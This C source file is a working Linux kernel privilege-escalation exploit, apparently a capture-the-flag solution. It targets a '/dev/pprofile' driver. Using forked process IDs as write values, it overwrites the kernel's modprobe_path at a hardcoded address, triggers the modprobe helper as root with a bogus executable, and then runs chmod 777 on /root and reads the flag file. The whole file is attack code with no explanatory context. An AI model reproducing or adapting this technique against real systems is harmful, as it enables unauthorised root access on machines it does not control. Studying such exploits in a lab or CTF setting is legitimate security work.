#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static void set_pid(int fd, int mask, int val) {
  /* fork until the current pid has the desired value */
  while ((getpid() & mask) != val) {
    pid_t pid = fork();
    assert(pid != -1);
    if (pid == 0)
      continue;
    exit(0);
  }

  printf("pid=%d\n", (int)getpid());

  /* set pid */
  int info[4] = {0, 0, 0, 0};
  void *req[2] = {"xxx", info};
  ioctl(fd, 0x40, &req);           /* delete the old one, if any */
  int ret = ioctl(fd, 0x20, &req); /* create */
  assert(ret == 3);

  /* sanity check */
  ret = ioctl(fd, 0x10, &req); /* lookup */
  assert(ret == 0);
  assert(info[0] == 0);
  assert(info[2] == getpid());
  assert(info[3] == 3);
}

int main(int argc, char **argv) {
  (void)argc;
  if (argv[0][strlen(argv[0]) - 1] == '\x01') {
    system("chmod 777 /root /root/flag");
    return EXIT_SUCCESS;
  }

  char cmd[64];
  snprintf(cmd, sizeof(cmd), "cp %s /tmp/\x01", argv[0]);
  cmd[sizeof(cmd) - 1] = 0;
  system(cmd);

  system("printf \"\\xff\\xff\\xff\\xff\" >/tmp/dummy && chmod a+x /tmp/dummy");

  int fd = open("/dev/pprofile", O_RDONLY);
  assert(fd != -1);

  char *modprobe_path_ptr = (char *)0xFFFFFFFF82256F40;
  void *req[2] = {"xxx", NULL};

  set_pid(fd, 0xff, 't');
  req[1] = modprobe_path_ptr - 7;
  int ret = ioctl(fd, 0x10, &req);
  assert(ret == 0);

  set_pid(fd, 0xff, 'm');
  req[1] = modprobe_path_ptr - 6;
  ret = ioctl(fd, 0x10, &req);
  assert(ret == 0);

  set_pid(fd, 0xff, 'p');
  req[1] = modprobe_path_ptr - 5;
  ret = ioctl(fd, 0x10, &req);
  assert(ret == 0);

  set_pid(fd, 0xffffff, '/' | ('\x01' << 8));
  req[1] = modprobe_path_ptr - 4;
  ret = ioctl(fd, 0x10, &req);
  assert(ret == 0);

  system("/tmp/dummy; cat /root/flag");
}